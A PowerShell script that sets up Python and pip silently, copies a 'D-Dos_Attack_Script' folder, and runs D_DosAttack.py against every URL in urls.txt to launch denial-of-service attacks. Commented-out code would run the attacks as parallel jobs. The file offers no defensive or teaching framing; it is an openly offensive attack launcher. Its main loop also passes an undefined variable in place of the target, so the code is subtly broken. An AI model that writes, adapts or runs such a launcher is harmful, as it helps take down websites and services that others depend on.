Set-Location -Path $env:APPDATA
cd ..

# install python
Write-Host "==============================="

$pythonPath = "${Env:AppData}\..\Local\Programs\Python\Python310"

If (!(Test-Path $pythonPath))
{
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe" -OutFile "python-3.10.2.exe"
    
    Write-Host "Python downloaded. "
    
    ./python-3.10.2.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
    
    Start-Sleep -Seconds 5
    
    $pythonPath = Resolve-Path $pythonPath

    Write-Host "Installed python at " $pythonPath
    $env:Path += ";" + $pythonPath

    Write-Host "Env:Path: " $Env:Path
}

$pythonPath = Resolve-Path $pythonPath

# install pip
cd $pythonPath

If (!(Test-Path "get-pip.py"))
{
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py"  -OutFile "get-pip.py"

    python get-pip.py

    $env:Path += ";${pythonPath}\Scripts"
    
    Start-Sleep -Seconds 5
    
    Write-Host "pip installed"
}

if (!(Test-Path "D-Dos_Attack_Script")) {
    Copy-Item -Path "${PSScriptRoot}\D-Dos_Attack_Script" -Recurse -Destination "${pythonPath}\D-Dos_Attack_Script"

    Write-Host "Copied ${PSScriptRoot}\D-Dos_Attack_Script to ${pythonPath}\D-Dos_Attack_Script"

    Start-Sleep -Seconds 5
}

$urls = [System.IO.File]::ReadLines("${PSScriptRoot}\urls.txt")
Write-Host "Attacking urls: " $urls

cd "D-Dos_Attack_Script"

pip install -r "requirements.txt"

$urls | ForEach-Object {
    Write-Host "DOSing ${_}"
    python "D_DosAttack.py" $url
    #Copy-Item -Path "D_DosAttack.py" -Destination "${_}_D_DosAttack.py"
    #Start-Job -ScriptBlock {
    #    param ($url)
    #        Write-Host "DOSing ${$url}"
    #        python "${url}_D_DosAttack.py" $url
    #} -ArgumentList $_
}

#foreach ($job in Get-Job) {
#    Receive-Job -Job $job -OutVariable temp
#    Write-Host ("Job Output: "+$temp)
#    Stop-Job $job
#}